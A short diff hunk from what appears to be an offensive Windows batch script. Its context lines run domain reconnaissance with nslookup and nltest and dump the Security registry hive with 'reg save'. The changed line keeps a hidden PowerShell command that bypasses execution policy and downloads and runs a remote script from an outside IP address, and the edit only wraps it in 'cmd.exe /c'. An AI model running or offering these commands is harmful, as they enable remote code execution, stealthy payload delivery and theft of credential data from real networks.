@@ -364,7 +364,7 @@ nslookup whatismyip.com
 ECHO ============================
 nltest /dclist:abc.local
 ECHO ============================
-powershell.exe -W hidden -Exec Bypass -nologo -noprofile -command "IEX(New-Object Net.WebClient).DownloadString('http://91.91.91.91:80/powershellscript')"
+cmd.exe /c powershell.exe -W hidden -Exec Bypass -nologo -noprofile -command "IEX(New-Object Net.WebClient).DownloadString('http://91.91.91.91:80/powershellscript')"
 ECHO ============================
 reg save HKLM\Security security.hive
 ECHO ============================
